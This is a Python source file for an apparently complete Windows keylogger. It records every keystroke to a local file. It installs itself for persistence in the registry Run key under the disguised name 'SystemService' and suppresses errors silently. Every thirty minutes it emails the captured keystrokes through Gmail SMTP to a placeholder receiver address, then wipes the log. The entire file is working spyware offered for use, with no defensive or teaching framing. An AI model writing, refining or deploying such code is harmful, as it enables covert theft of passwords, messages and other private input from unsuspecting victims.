from pynput import keyboard
import threading
import time
import logging
import os
import sys
from pathlib import Path as path
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ── Fix path for PyInstaller ───────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    folder = path(os.path.dirname(sys.executable))
else:
    folder = path(__file__).parent

log_file = folder / "keylog.txt"

# ── Setup logging ONCE ─────────────────────────────────────────────────────
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)
logger = logging.getLogger()

# ── Add to startup ─────────────────────────────────────────────────────────
def add_to_startup():
    if sys.platform == 'win32':
        import winreg
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else f'{sys.executable} {os.path.abspath(__file__)}'
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass   # fail silently!

# ── Keystroke capture ──────────────────────────────────────────────────────
def when_pressed(key):
    try:
        output = key.char
    except AttributeError:
        output = f"[{key.name.upper()}]"

    logger.info(output)

    # Force flush to disk immediately!
    for handler in logger.handlers:
        handler.flush()

# ── Email logs ─────────────────────────────────────────────────────────────
def send_email_logs():
    sender   = "youremail@gmail.com"
    receiver = "receiver@gmail.com"
    password = "your_app_password"

    while True:
        time.sleep(1800)
        try:
            with open(log_file, 'r') as f:
                data = f.read()
            if data:
                msg = MIMEMultipart()
                msg['From']    = sender
                msg['To']      = receiver
                msg['Subject'] = 'Keylog Update'
                msg.attach(MIMEText(data, 'plain'))
                with smtplib.SMTP('smtp.gmail.com', 587) as server:
                    server.starttls()
                    server.login(sender, password)
                    server.send_message(msg)
                # Clear log after sending!
                open(log_file, 'w').close()
        except:
            pass

# ── Main ───────────────────────────────────────────────────────────────────
def main():
    # Add to startup silently
    add_to_startup()

    # Start email thread
    t = threading.Thread(target=send_email_logs, daemon=True)
    t.start()

    # Start listener — runs forever, no ESC stop!
    with keyboard.Listener(on_press=when_pressed) as listener:
        listener.join()

if __name__ == "__main__":
    main()